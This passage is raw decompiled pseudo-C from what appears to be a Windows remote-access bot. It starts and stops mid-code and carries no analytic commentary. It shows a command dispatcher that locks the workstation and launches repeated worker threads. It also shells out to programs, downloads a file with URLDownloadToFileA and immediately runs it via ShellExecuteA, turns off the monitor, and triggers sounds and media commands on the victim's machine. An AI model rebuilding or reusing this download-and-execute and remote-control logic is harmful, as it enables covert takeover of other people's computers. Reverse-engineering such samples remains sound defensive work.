sub.user32.dll_LockWorkStation();\n        }\n        var_758h = &fcn.00472f6c::var_854h;\n        var_75ch = 0x4781f4;\n        fcn.00405964();\n        var_75ch = 0x478204;\n        fcn.00405894();\n        if (uVar10) {\n            var_75ch = 0x47821c;\n            fcn.004059a4();\n            var_75ch = &fcn.00472f6c::var_20h;\n            var_760h = 0x47822d;\n            fcn.00405a48();\n            var_760h = 0x47823d;\n            fcn.00405964();\n            var_760h = 0x47824a;\n            fcn.00405a48();\n            var_760h = 0x478259;\n            fcn.004059a4();\n            var_760h = &fcn.00472f6c::var_24h;\n            var_764h = 0x47826a;\n            fcn.00405a48();\n            var_764h = 0x47827a;\n            fcn.00405964();\n            var_764h = 0x478287;\n            fcn.00405a48();\n            var_764h = 0x478296;\n            fcn.004059a4();\n            var_764h = 0x4782a1;\n            fcn.00405504();\n            var_764h = 0x4782b2;\n            fcn.00405664();\n            var_764h = var_858h;\n            lParam = 0x47c2f8;\n            var_76ch = 0x4782cf;\n            fcn.00409ce8();\n            var_76ch = var_85ch;\n            var_770h = 0x47c2f8;\n            var_774h = 0x4782e5;\n            fcn.0048c8a8();\n            var_774h = var_860h;\n            var_778h = 0x47c2f8;\n            var_77ch = 0x4782fb;\n            fcn.0048beec();\n            var_77ch = var_864h;\n            var_780h = 0x47c028;\n            var_784h = 0x478311;\n            fcn.0048beb0();\n            var_784h = var_868h;\n            var_788h = 0x47c2f8;\n            var_78ch = 0x478327;\n            fcn.0048c5c8();\n            var_78ch = var_86ch;\n            var_790h = 0x47c2f8;\n            var_794h = 0x47833d;\n            fcn.00463c44();\n            var_794h = var_870h;\n            var_798h = 0x47c2f8;\n            var_79ch = 0x47cf40;\n            var_7a0h = 0x47c2f8;\n            var_7a4h = 0x47835d;\n            fcn.0048bf90();\n            var_7a4h = var_874h;\n            var_7a8h = 0x47c2f8;\n            var_7ach = 0x478373;\n            fcn.0048c21c();\n            var_7ach = var_878h;\n            var_7b0h = 0x47c2f8;\n            var_7b4h = 0x478389;\n            fcn.0048c2cc();\n            var_7b4h = var_87ch;\n            var_7b8h = 0x47c2f8;\n            var_7bch = 0x47839f;\n            fcn.0048c378();\n            var_7bch = var_880h;\n            var_7c0h = 0x47c2f8;\n            var_7c4h = 0x4783b5;\n            fcn.0048c500();\n            var_7c4h = var_884h;\n            var_7c8h = 0x47c2f8;\n            var_7cch = 0x4783cb;\n            fcn.0048c8d8();\n            var_7cch = var_888h;\n            var_7d0h = 0x47c2f8;\n            var_7d4h = 0x4783e1;\n            fcn.0048c908();\n            var_7d4h = var_88ch;\n            var_7d8h = 0x47c2f8;\n            var_7dch = 0x4783f7;\n            fcn.0048cbf4();\n            var_7dch = var_890h;\n            var_7e0h = 0x47c2f8;\n            var_7e4h = 0x47840d;\n            fcn.00464104();\n            var_7e4h = 0x47841e;\n            fcn.0048cc8c();\n            var_7e4h = var_894h;\n            var_7e8h = 0x47c2f8;\n            uVar10 = 1;\n            var_7ech = 0x478436;\n            fcn.0040f1a8();\n            var_7ech = var_89ch;\n            var_7f0h = 0x47c2f8;\n            var_7f4h = *0x498868;\n            var_7f8h = 0x47c2f8;\n            var_7fch = *0x498920;\n            var_800h = 0x47c2f8;\n            var_804h = 0x478467;\n            fcn.0048b2c8();\n            var_804h = var_8a0h;\n            var_808h = 0x47c2f8;\n            var_80ch = 0x47847d;\n            fcn.0048b358();\n            var_80ch = var_8a4h;\n            var_810h = 0x478490;\n            fcn.00405800();\n            var_810h = 0x14;\n            var_814h = 0x40;\n            var_818h = 0x478499;\n            var_820h = sub.kernel32.dll_LocalAlloc_1();\n            var_818h = 0x4784a7;\n            fcn.004054c0();\n            var_818h = 0x4784b2;\n            fcn.004054c0();\n            var_818h = 0x4784bd;\n            fcn.004054c0();\n            var_818h = 0x4784c8;\n            fcn.004054c0();\n            var_818h = 0x4784d5;\n            fcn.004054c0();\n            var_818h = &fcn.00472f6c::var_2b4h;\n            var_81ch = 0;\n            var_824h = fcn.00485178;\n            var_828h = 0;\n            var_82ch = 0;\n            var_830h = 0x4784ed;\n            var_830h = sub.kernel32.dll_CreateThread();\n            var_834h = 0x4784f3;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        var_834h = &fcn.00472f6c::var_8a8h;\n        var_838h = 0x47850c;\n        fcn.00405964();\n        var_838h = 0x47851c;\n        fcn.00405894();\n        if (uVar10) {\n            var_838h = 0x478530;\n            fcn.004059a4();\n            var_838h = 5;\n            var_83ch = 0;\n            var_840h = 0;\n            var_844h = 0x47853e;\n            var_844h = fcn.004058fc();\n            var_848h = 0x47bd5c;\n            var_84ch = 0;\n            var_850h = 0x47854b;\n            sub.shell32.dll_ShellExecuteA();\n        }\n        var_850h = &fcn.00472f6c::var_8ach;\n        var_854h = 0x478564;\n        fcn.00405964();\n        var_854h = 0x478574;\n        fcn.00405894();\n        if (uVar10) {\n            var_854h = 0x47858c;\n            fcn.004059a4();\n            var_858h = 0x4787cf;\n            var_85ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_85ch;\n            var_860h = &fcn.00472f6c::var_110h;\n            var_864h = 0x4785ae;\n            var_854h = &stack0xfffffffc;\n            fcn.00405a48();\n            var_864h = 0x4785be;\n            fcn.00405964();\n            var_864h = 0x4785cb;\n            fcn.00405a48();\n            var_864h = 0x4785da;\n            fcn.004059a4();\n            var_864h = 0x4785e8;\n            fcn.00405504();\n            var_864h = 0x4785f3;\n            iVar7 = fcn.00409e54();\n            do {\n                var_864h = &fcn.00472f6c::var_118h;\n                var_868h = 0x478616;\n                fcn.00405a48();\n                var_868h = 0x478629;\n                fcn.00405964();\n                var_868h = 0x478639;\n                fcn.00405a48();\n                var_868h = 0x47864b;\n                fcn.004059a4();\n                var_868h = &fcn.00472f6c::var_100h;\n                var_86ch = 0x478662;\n                fcn.00405a48();\n                var_86ch = 0x478675;\n                fcn.00405964();\n                var_86ch = 0x478685;\n                fcn.00405a48();\n                var_86ch = 0x478697;\n                fcn.004059a4();\n                var_86ch = &fcn.00472f6c::var_104h;\n                var_870h = 0x4786ae;\n                fcn.00405a48();\n                var_870h = 0x4786c1;\n                fcn.00405964();\n                var_870h = 0x4786d1;\n                fcn.00405a48();\n                var_870h = 0x4786e3;\n                fcn.004059a4();\n                var_870h = &fcn.00472f6c::var_108h;\n                var_874h = 0x4786fa;\n                fcn.00405a48();\n                var_874h = 0x47870d;\n                fcn.00405964();\n                var_874h = 0x47871d;\n                fcn.00405a48();\n                var_874h = 0x47872f;\n                fcn.004059a4();\n                var_874h = 0x478740;\n                fcn.00405504();\n                var_874h = 0x10;\n                var_878h = 0x40;\n                var_87ch = 0x478749;\n                piVar5 = sub.kernel32.dll_LocalAlloc_1();\n                var_87ch = 0x478764;\n                var_300h = piVar5;\n                fcn.004054c0();\n                var_87ch = 0x478778;\n                fcn.004054c0();\n                var_87ch = 0x47878c;\n                fcn.004054c0();\n                var_87ch = 0x4787a0;\n                fcn.004054c0();\n                var_87ch = &fcn.00472f6c::var_2e0h;\n                var_880h = NULL;\n                var_888h = fcn.00472788;\n                var_88ch = NULL;\n                var_890h = NULL;\n                var_894h = 0x4787b8;\n                var_884h = piVar5;\n                var_860h = sub.kernel32.dll_CreateThread();\n                var_898h = 0x4787be;\n                sub.kernel32.dll_CloseHandle_1();\n                iVar7 = iVar7 + -1;\n            } while (iVar7 != 0);\n            uVar10 = 1;\n            *in_FS_OFFSET = var_860h;\n        }\n        var_858h = &fcn.00472f6c::var_8b0h;\n        var_85ch = 0x4787f2;\n        fcn.00405964();\n        var_85ch = 0x478802;\n        fcn.00405894();\n        if (uVar10) {\n            var_85ch = 0x47881a;\n            fcn.004059a4();\n            var_860h = 0x4788fc;\n            var_864h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_864h;\n            var_868h = &fcn.00472f6c::var_100h;\n            var_86ch = 0x47883c;\n            var_85ch = &stack0xfffffffc;\n            fcn.00405a48();\n            var_86ch = 0x47884c;\n            fcn.00405964();\n            var_86ch = 0x478859;\n            fcn.00405a48();\n            var_86ch = 0x478868;\n            fcn.004059a4();\n            var_86ch = 0x478876;\n            fcn.00405504();\n            var_86ch = 0x10;\n            var_870h = 0x40;\n            var_874h = 0x47887f;\n            puVar6 = sub.kernel32.dll_LocalAlloc_1();\n            var_874h = 0x47889a;\n            var_304h = puVar6;\n            fcn.004054c0();\n            var_874h = 0x4788ae;\n            fcn.004054c0();\n            var_874h = 0x4788c1;\n            fcn.004054c0();\n            var_874h = 0x4788d4;\n            fcn.004054c0();\n            var_874h = &fcn.00472f6c::var_2e0h;\n            var_878h = 0;\n            var_880h = fcn.00472788;\n            var_884h = NULL;\n            var_888h = NULL;\n            var_88ch = 0x4788ec;\n            var_87ch = puVar6;\n            var_88ch = sub.kernel32.dll_CreateThread();\n            var_890h = 0x4788f2;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_88ch;\n        }\n        var_884h = &fcn.00472f6c::var_8b4h;\n        var_888h = 0x47891f;\n        fcn.00405964();\n        var_888h = 0x47892f;\n        fcn.00405894();\n        if (uVar10) {\n            var_888h = 0x478947;\n            fcn.004059a4();\n            var_888h = &fcn.00472f6c::var_1ch;\n            var_88ch = 0x478958;\n            fcn.00405a48();\n            var_88ch = 0x478968;\n            fcn.00405964();\n            var_88ch = 0x478975;\n            fcn.00405a48();\n            var_88ch = 0x478984;\n            fcn.004059a4();\n            var_88ch = &fcn.00472f6c::var_20h;\n            var_890h = 0x478995;\n            fcn.00405a48();\n            var_890h = 0x4789a5;\n            fcn.00405964();\n            var_890h = 0x4789b2;\n            fcn.00405a48();\n            var_890h = 0x4789c1;\n            fcn.004059a4();\n            var_890h = &fcn.00472f6c::var_24h;\n            var_894h = 0x4789d2;\n            fcn.00405a48();\n            var_894h = 0x4789e2;\n            fcn.00405964();\n            var_894h = 0x4789ef;\n            fcn.00405a48();\n            var_894h = 0x4789fe;\n            fcn.004059a4();\n            var_894h = &fcn.00472f6c::var_28h;\n            var_898h = 0x478a0f;\n            fcn.00405a48();\n            var_898h = 0x478a1f;\n            fcn.00405964();\n            var_898h = 0x478a2c;\n            fcn.00405a48();\n            var_898h = 0x478a3b;\n            fcn.004059a4();\n            var_898h = 0x478a46;\n            fcn.00405504();\n            var_898h = 0x14;\n            var_89ch = 0x40;\n            var_8a0h = 0x478a4f;\n            var_8a8h = sub.kernel32.dll_LocalAlloc_1();\n            var_8a0h = 0x478a67;\n            var_308h = var_8a8h;\n            fcn.004054c0();\n            var_8a0h = 0x478a78;\n            fcn.004054c0();\n            var_8a0h = 0x478a89;\n            fcn.004054c0();\n            var_8a0h = 0x478a9a;\n            fcn.004054c0();\n            uVar10 = var_308h == 0xfffffff0;\n            var_8a0h = 0x478aab;\n            fcn.004054c0();\n            var_8a0h = &fcn.00472f6c::var_2b4h;\n            var_8a4h = 0;\n            var_8ach = fcn.00487540;\n            var_8b0h = 0;\n            var_8b4h = 0;\n            var_8b8h = 0x478ac3;\n            var_8b8h = sub.kernel32.dll_CreateThread();\n            var_8bch = 0x478ac9;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        var_8bch = &fcn.00472f6c::var_8b8h;\n        var_8c0h = 0x478ae2;\n        fcn.00405964();\n        var_8c0h = 0x478af2;\n        fcn.00405894();\n        if (uVar10) {\n            var_8c0h = 0x478b0a;\n            fcn.004059a4();\n            var_8c4h = 0x478b84;\n            var_8c8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_8c8h;\n            var_8cch = 0x478b23;\n            var_8c0h = &stack0xfffffffc;\n            fcn.00463d78();\n            var_8cch = 0x478b33;\n            fcn.00405738();\n            var_8cch = 0x478b41;\n            fcn.00489aa0();\n            var_8cch = 0;\n            var_8d0h = 0;\n            var_8d4h = 0;\n            var_8d8h = 0x478b52;\n            fcn.00463d78();\n            var_8d8h = 0x478b62;\n            fcn.00405738();\n            var_8d8h = 0x478b6d;\n            var_8d8h = fcn.004058fc();\n            var_8dch = 0x47cfd8;\n            var_8e0h = NULL;\n            var_8e4h = 0x478b7a;\n            sub.shell32.dll_ShellExecuteA();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_8e0h;\n        }\n        var_8d8h = 0x478b9b;\n        fcn.00405894();\n        if (uVar10) {\n            var_8dch = 0x478c39;\n            var_8e0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_8e0h;\n            var_8e4h = 0x478bba;\n            var_8d8h = &stack0xfffffffc;\n            fcn.00467c30();\n            if (var_8c4h != 0) {\n                var_8e4h = 0x478bce;\n                fcn.00467c30();\n                var_8e4h = 0x478be4;\n                fcn.00405784();\n                var_8e4h = 0x478bef;\n                fcn.00472b58();\n            }\n            var_8e4h = 0x478bfa;\n            fcn.00467c5c();\n            if (var_8d0h != 0) {\n                var_8e4h = 0x478c0e;\n                fcn.00467c5c();\n                var_8e4h = 0x478c24;\n                fcn.00405784();\n                var_8e4h = 0x478c2f;\n                fcn.00472b58();\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = var_8e0h;\n        }\n        var_8d8h = 0x478c50;\n        fcn.00405894();\n        if (uVar10) {\n            var_8d8h = 0x478c5d;\n            fcn.00467c30();\n            var_8d8h = 0x478c73;\n            fcn.00405784();\n            var_8d8h = 0x478c7e;\n            fcn.00472b58();\n        }\n        var_8d8h = &fcn.00472f6c::var_8e4h;\n        var_8dch = 0x478c97;\n        fcn.00405964();\n        var_8dch = 0x478ca7;\n        fcn.00405894();\n        if (uVar10) {\n            var_8dch = 0x478cbb;\n            fcn.004059a4();\n            var_8e0h = 0x478d0f;\n            var_8e4h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_8e4h;\n            var_8e8h = *0x47d068;\n            var_8ech = &fcn.00472f6c::var_8e8h;\n            var_8f0h = 0x478cea;\n            var_8dch = &stack0xfffffffc;\n            fcn.0040eeb8(var_8ech, var_8e8h);\n            var_8f0h = 0x478cf8;\n            fcn.00405504();\n            var_8f0h = 0x478cfd;\n            fcn.00430e94();\n            var_8f0h = 0x478d05;\n            fcn.00430a1c();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_8ech;\n        }\n        var_8e4h = 0x478d26;\n        fcn.00405894();\n        if (uVar10) {\n            var_8e8h = 0x478d4a;\n            var_8ech = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_8ech;\n            var_8f0h = 0x478d3b;\n            var_8e4h = &stack0xfffffffc;\n            piVar5 = fcn.00430e94();\n            var_8f0h = 0x478d40;\n            (**(*piVar5 + 0x10))();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_8ech;\n        }\n        var_8e4h = 0x478d61;\n        fcn.00405894();\n        if (uVar10) {\n            var_8e4h = 0x478d6e;\n            fcn.00489c6c();\n            var_8e4h = 0x478d84;\n            fcn.00405784();\n            var_8e4h = 0x478d8f;\n            fcn.00472b58();\n        }\n        var_8e4h = &fcn.00472f6c::var_8f4h;\n        var_8e8h = 0x478da8;\n        fcn.00405964();\n        var_8e8h = 0x478db8;\n        fcn.00405894();\n        if (uVar10) {\n            var_8e8h = 0x478dd0;\n            fcn.004059a4();\n            var_8ech = 0x478f00;\n            var_8f0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_8f0h;\n            var_8f4h = &fcn.00472f6c::var_1ch;\n            var_8f8h = 0x478def;\n            var_8e8h = &stack0xfffffffc;\n            fcn.00405a48();\n            var_8f8h = 0x478dff;\n            fcn.00405964();\n            var_8f8h = 0x478e0c;\n            fcn.00405a48();\n            var_8f8h = 0x478e1b;\n            fcn.004059a4();\n            var_8f8h = &fcn.00472f6c::var_20h;\n            var_8fch = 0x478e2c;\n            fcn.00405a48();\n            var_8fch = 0x478e3c;\n            fcn.00405964();\n            var_8fch = 0x478e49;\n            fcn.00405a48();\n            var_8fch = 0x478e58;\n            fcn.004059a4();\n            var_8fch = 0x478e63;\n            fcn.00405504();\n            var_8fch = 0x14;\n            var_900h = 0x40;\n            var_904h = 0x478e6c;\n            var_90ch = sub.kernel32.dll_LocalAlloc_1();\n            var_904h = 0x478e81;\n            var_30ch = var_90ch;\n            fcn.00467df4();\n            var_904h = 0x478e92;\n            fcn.004054c0();\n            var_904h = 0x478ea3;\n            fcn.004054c0();\n            var_904h = 0x478eb4;\n            fcn.004054c0();\n            var_904h = 0x478ec5;\n            fcn.004054c0();\n            var_904h = 0x478ed8;\n            fcn.004054c0();\n            var_904h = &fcn.00472f6c::var_2b4h;\n            var_908h = 0;\n            var_910h = fcn.00485178;\n            var_914h = NULL;\n            puStack2332 = NULL;\n            piStack2336 = 0x478ef0;\n            piStack2336 = sub.kernel32.dll_CreateThread();\n            piStack2340 = 0x478ef6;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2336;\n        }\n        var_914h = 0x478f21;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2332 = 0x478f8c;\n            piStack2336 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff6e0;\n            piStack2340 = 0x478f3c;\n            var_914h = &stack0xfffffffc;\n            fcn.00468410();\n            piStack2340 = 0x478f4d;\n            fcn.00409af4();\n            if (var_8fch != 0) {\n                piStack2340 = 0x478f61;\n                fcn.00468410();\n                piStack2340 = 0x478f77;\n                fcn.00405784();\n                piStack2340 = 0x478f82;\n                fcn.00472b58();\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2336;\n        }\n        var_914h = &fcn.00472f6c::var_90ch;\n        puStack2332 = 0x478faf;\n        fcn.00405964();\n        puStack2332 = 0x478fbf;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2332 = 0x478fd7;\n            fcn.004059a4();\n            piStack2336 = 0x4791c2;\n            piStack2340 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff6dc;\n            uStack2344 = 0x498860;\n            puStack2348 = 0x478ff7;\n            puStack2332 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack2348 = 0x479007;\n            fcn.00405964();\n            puStack2348 = 0x479014;\n            fcn.00405a48();\n            puStack2348 = 0x479023;\n            fcn.004059a4();\n            puStack2348 = &fcn.00472f6c::var_28h;\n            puStack2352 = 0x479034;\n            fcn.00405a48();\n            puStack2352 = 0x479044;\n            fcn.00405964();\n            puStack2352 = 0x479051;\n            fcn.00405a48();\n            puStack2352 = 0x479060;\n            fcn.004059a4();\n            puStack2352 = &fcn.00472f6c::var_1ch;\n            puStack2356 = 0x479071;\n            fcn.00405a48();\n            puStack2356 = 0x479081;\n            fcn.00405964();\n            puStack2356 = 0x47908e;\n            fcn.00405a48();\n            puStack2356 = 0x47909d;\n            fcn.004059a4();\n            puStack2356 = &fcn.00472f6c::var_20h;\n            uStack2360 = 0x4790ae;\n            fcn.00405a48();\n            uStack2360 = 0x4790be;\n            fcn.00405964();\n            uStack2360 = 0x4790cb;\n            fcn.00405a48();\n            uStack2360 = 0x4790da;\n            fcn.004059a4();\n            uStack2360 = 0x4790e5;\n            fcn.00405504();\n            uStack2360 = 0x4790ed;\n            iVar7 = fcn.00409e54();\n            if (iVar7 == 1) {\n                *0x498864 = 1;\n            }\n            else if (iVar7 == 8) {\n                *0x498864 = 3;\n            }\n            else if (iVar7 == 0x10) {\n                *0x498864 = 5;\n            }\n            else if (iVar7 == 0x20) {\n                *0x498864 = 7;\n            }\n            else {\n                *0x498864 = 3;\n            }\n            uStack2360 = 0x14;\n            uStack2364 = 0x40;\n            puStack2368 = 0x479135;\n            puStack2376 = sub.kernel32.dll_LocalAlloc_1();\n            puStack2368 = 0x47914a;\n            var_310h = puStack2376;\n            fcn.0040546c();\n            puStack2368 = 0x47915b;\n            fcn.004054c0();\n            puStack2368 = 0x47916c;\n            fcn.004054c0();\n            puStack2368 = 0x47917d;\n            fcn.004054c0();\n            puStack2368 = 0x479190;\n            fcn.004054c0();\n            puStack2368 = &fcn.00472f6c::var_2b4h;\n            uStack2372 = 0;\n            pcStack2380 = fcn.00487cec;\n            puStack2384 = NULL;\n            puStack2388 = NULL;\n            piStack2392 = 0x4791a8;\n            piStack2392 = sub.kernel32.dll_CreateThread();\n            piStack2396 = 0x4791ae;\n            sub.kernel32.dll_CloseHandle_1();\n            *0x498910 = 1;\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2392;\n        }\n        puStack2384 = &fcn.00472f6c::var_910h;\n        puStack2388 = 0x4791e5;\n        fcn.00405964();\n        puStack2388 = 0x4791f5;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2388 = 0x47920d;\n            fcn.004059a4();\n            piStack2392 = 0x47933d;\n            piStack2396 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff6a4;\n            puStack2400 = &fcn.00472f6c::var_1ch;\n            puStack2404 = 0x47922c;\n            puStack2388 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack2404 = 0x47923c;\n            fcn.00405964();\n            puStack2404 = 0x479249;\n            fcn.00405a48();\n            puStack2404 = 0x479258;\n            fcn.004059a4();\n            puStack2404 = &fcn.00472f6c::var_20h;\n            var_964h = 0x479269;\n            fcn.00405a48();\n            var_964h = 0x479279;\n            fcn.00405964();\n            var_964h = 0x479286;\n            fcn.00405a48();\n            var_964h = 0x479295;\n            fcn.004059a4();\n            var_964h = 0x4792a0;\n            fcn.00405504();\n            var_964h = 0x14;\n            var_968h = 0x40;\n            puStack2416 = 0x4792a9;\n            puStack2424 = sub.kernel32.dll_LocalAlloc_1();\n            puStack2416 = 0x4792be;\n            var_314h = puStack2424;\n            fcn.00489d98();\n            puStack2416 = 0x4792cf;\n            fcn.004054c0();\n            puStack2416 = 0x4792e0;\n            fcn.004054c0();\n            puStack2416 = 0x4792f1;\n            fcn.004054c0();\n            puStack2416 = 0x479302;\n            fcn.004054c0();\n            puStack2416 = 0x479315;\n            fcn.004054c0();\n            puStack2416 = &fcn.00472f6c::var_2b4h;\n            uStack2420 = 0;\n            pcStack2428 = fcn.00485178;\n            puStack2432 = NULL;\n            puStack2436 = NULL;\n            piStack2440 = 0x47932d;\n            piStack2440 = sub.kernel32.dll_CreateThread();\n            uStack2444 = 0x479333;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2440;\n        }\n        puStack2432 = 0x47935e;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479365;\n            fcn.0046434c();\n        }\n        puStack2432 = 0x479372;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479379;\n            fcn.00464370();\n        }\n        puStack2432 = 0x479386;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x47938d;\n            fcn.00464174();\n        }\n        puStack2432 = 0x47939a;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x4793a1;\n            fcn.004641d8();\n        }\n        puStack2432 = 0x4793ae;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x4793b5;\n            fcn.0046423c();\n        }\n        puStack2432 = 0x4793c2;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x4793c9;\n            fcn.00464280();\n        }\n        puStack2432 = 0x4793d6;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x4793dd;\n            fcn.004642c4();\n        }\n        puStack2432 = 0x4793ea;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x4793f1;\n            fcn.00464308();\n        }\n        puStack2432 = 0x4793fe;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479405;\n            fcn.00468168();\n        }\n        puStack2432 = 0x479412;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479419;\n            fcn.00468140();\n        }\n        puStack2432 = 0x479426;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            puStack2432 = 0x47942f;\n            fcn.004681b8();\n        }\n        puStack2432 = 0x47943c;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479445;\n            fcn.004681b8();\n        }\n        puStack2432 = 0x479452;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            puStack2432 = 0x47945b;\n            fcn.004680d8();\n        }\n        puStack2432 = 0x479468;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479471;\n            fcn.004680d8();\n        }\n        puStack2432 = 0x47947e;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x479487;\n            fcn.00467f9c();\n        }\n        puStack2432 = 0x479494;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            puStack2432 = 0x47949d;\n            fcn.00467f9c();\n        }\n        puStack2432 = 0x4794aa;\n        fcn.00405894();\n        puStack2432 = 0x4794b7;\n        fcn.00405894();\n        puStack2432 = 0x4794c4;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = 0x4794cb;\n            fcn.00468190();\n        }\n        puStack2432 = 0x4794d8;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2432 = NULL;\n            puStack2436 = NULL;\n            piStack2440 = NULL;\n            uStack2444 = 0x47d320;\n            puStack2448 = 0x4794ea;\n            sub.winmm.dll_mciSendStringA();\n        }\n        puStack2432 = &stack0xfffff6e4;\n        puStack2436 = 0x479503;\n        fcn.00405964();\n        puStack2436 = 0x479513;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2436 = 0x479527;\n            fcn.004059a4();\n            puStack2436 = &fcn.00472f6c::var_28h;\n            piStack2440 = 0x479538;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            piStack2440 = 0x479548;\n            fcn.00405964();\n            piStack2440 = 0x479555;\n            fcn.00405a48();\n            piStack2440 = 0x479564;\n            fcn.004059a4();\n            piStack2440 = 0x47956c;\n            piStack2440 = fcn.00409e54();\n            uStack2444 = 0x479575;\n            uStack2444 = fcn.00409e54();\n            puStack2448 = 0x47957b;\n            sub.kernel32.dll_Beep();\n        }\n        puStack2448 = &stack0xfffff6e0;\n        puStack2452 = 0x479594;\n        fcn.00405964();\n        puStack2452 = 0x4795a4;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2452 = 0x4795bc;\n            fcn.004059a4();\n            puStack2452 = 0x4795cb;\n            fcn.00405894();\n            if (uVar10) {\n                puStack2452 = 0x4795d4;\n                fcn.00488ba4();\n            }\n            puStack2452 = 0x4795e3;\n            fcn.00405894();\n            if (uVar10) {\n                puStack2452 = 0x4795ec;\n                fcn.00488cf8();\n            }\n            puStack2452 = 0x4795fb;\n            fcn.00405894();\n            if (uVar10) {\n                puStack2452 = 0x479604;\n                fcn.0048a324();\n            }\n            bVar11 = true;\n            uStack2456 = 0x479649;\n            piStack2460 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff664;\n            uStack2464 = 0x479621;\n            puStack2452 = &stack0xfffffffc;\n            fcn.00405894();\n            if (bVar11) {\n                uStack2464 = 0xffffffff;\n                puStack2468 = 0xf170;\n                puStack2472 = 0x112;\n                piStack2476 = *(**0x49291c + 0x30);\n                piStack2480 = 0x47963f;\n                sub.user32.dll_SendMessageA();\n            }\n            uVar10 = true;\n            *in_FS_OFFSET = piStack2476;\n            puStack2468 = 0x479660;\n            fcn.00405894();\n            if (uVar10) {\n                puStack2468 = 0x479669;\n                fcn.00472134();\n            }\n            else {\n                uVar10 = 1;\n                puStack2468 = 0x479672;\n                fcn.00472134();\n            }\n        }\n        puStack2468 = &stack0xfffff6dc;\n        puStack2472 = 0x47968b;\n        fcn.00405964();\n        puStack2472 = 0x47969b;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2472 = 0x4796b3;\n            fcn.004059a4();\n            piStack2476 = 0x479746;\n            piStack2480 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff650;\n            uStack2484 = 0;\n            uStack2488 = 0;\n            uStack2492 = 0x4796d0;\n            puStack2472 = &stack0xfffffffc;\n            fcn.00463d78();\n            uStack2492 = 0x4796e0;\n            fcn.00405738();\n            uStack2492 = 0x4796eb;\n            uStack2492 = fcn.004058fc();\n            uStack2496 = 0x4796f4;\n            uStack2496 = fcn.004058fc();\n            uStack2500 = 0;\n            uStack2504 = 0x4796fc;\n            sub.URLMON.DLL_URLDownloadToFileA();\n            uStack2504 = 5;\n            uStack2508 = 0;\n            uStack2512 = 0;\n            puStack2516 = 0x47970d;\n            fcn.00463d78();\n            puStack2516 = 0x47971d;\n            fcn.00405738();\n            puStack2516 = 0x479728;\n            puStack2516 = fcn.004058fc();\n            puStack2520 = 0x47bd5c;\n            piStack2524 = NULL;\n            piStack2528 = 0x479735;\n            sub.shell32.dll_ShellExecuteA();\n            piStack2528 = 0x47973c;\n            fcn.00472134();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack2524;\n        }\n        puStack2516 = &stack0xfffff6d0;\n        puStack2520 = 0x479769;\n        fcn.00405964();\n        puStack2520 = 0x479779;\n        fcn.00405894();\n        if (uVar10) {\n            puStack2520 = 0x479791;\n            fcn.004059a4();\n            piStack2524 = 0x479899;\n            piStack2528 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff620;\n            uStack2532 = 0x498850;\n            uStack2536 = 0x4797b1;\n            puStack2520 = &stack0xfffffffc;\n            fcn.00405a48();\n            uStack2536 = 0x4797c1;\n            fcn.00405964();\n            uStack2536 = 0x4797ce;\n            fcn.00405a48();\n            uStack2536 = 0x4797dd;\n            fcn.004059a4();\n            uStack2536 = 0x498854;\n            uStack2540 = 0x4797ef;\n            fcn.00405a48();\n            uStack2540 = 0x4797ff;\n            fcn.00405964();\n            uStack2540 = 0x47980c;\n            fcn.00405a48();\n            uStack2540 = 